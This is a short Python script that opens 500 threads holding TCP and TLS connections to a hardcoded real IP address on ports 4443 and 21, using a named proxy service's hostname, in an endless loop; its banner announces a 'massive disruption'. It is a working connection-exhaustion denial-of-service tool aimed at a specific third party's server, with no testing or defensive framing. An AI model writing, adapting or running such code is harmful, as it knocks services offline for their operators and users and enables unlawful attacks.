import socket
import threading
import time
import ssl

TARGET_IP = "46.183.184.147"
PORTS = [4443, 21]
CONCURRENT_CONNECTIONS = 250 # Total threads: 500 (250 per port)

def disrupt_port(port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((TARGET_IP, port))
            
            if port == 4443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with context.wrap_socket(sock, server_hostname="dinosaur.getfoxyproxy.org") as ssock:
                    time.sleep(15)
            else:
                time.sleep(15)
                sock.close()
                
        except Exception:
            pass
        time.sleep(0.05)

if __name__ == "__main__":
    print(f"[!] ASTRO OVERDRIVE: INITIATING MASSIVE DISRUPTION ON {TARGET_IP}")
    
    threads = []
    for port in PORTS:
        for i in range(CONCURRENT_CONNECTIONS):
            t = threading.Thread(target=disrupt_port, args=(port,))
            t.daemon = True
            t.start()
            threads.append(t)
            
    print(f"[+] OVERDRIVE ACTIVE: {len(threads)} aggressive threads engaged.")
    
    try:
        while True:
            time.sleep(60)
            # Log to file instead of stdout to keep background clean
            with open("/workspaces/blackarch/overdrive.log", "a") as f:
                f.write(f"[*] {time.ctime()}: 500 threads holding position.\n")
    except KeyboardInterrupt:
        pass
